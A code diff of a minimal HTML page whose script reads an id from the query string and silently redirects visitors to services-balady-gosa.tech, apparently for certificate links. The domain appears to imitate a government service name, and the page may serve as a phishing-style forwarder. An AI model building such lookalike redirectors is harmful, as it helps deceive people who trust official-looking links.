@@ -4,25 +4,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>...</title>
+    <title>.</title>
 
     <script>
-        const path = window.location.pathname;
-        const query = window.location.search;
+        const params = new URLSearchParams(window.location.search);
 
-        // Get everything after the first /
-        const id = path.replace(/^\/+/, '');
+        const id = params.get("id");
+        const type = params.get("type");
 
         if (id) {
-            window.location.replace(
-                'https://services-balady-gosa.tech/' + id + query
-            );
-        } else {
-            document.body.innerHTML = '<h3>Invalid certificate URL</h3>';
+            let target = "https://services-balady-gosa.tech/view/" +
+                         encodeURIComponent(id);
+
+            if (type) {
+                target += "?type=" + encodeURIComponent(type);
+            }
+
+            window.location.replace(target);
         }
     </script>
 </head>
 
-<body>
-</body>
+
 </html>
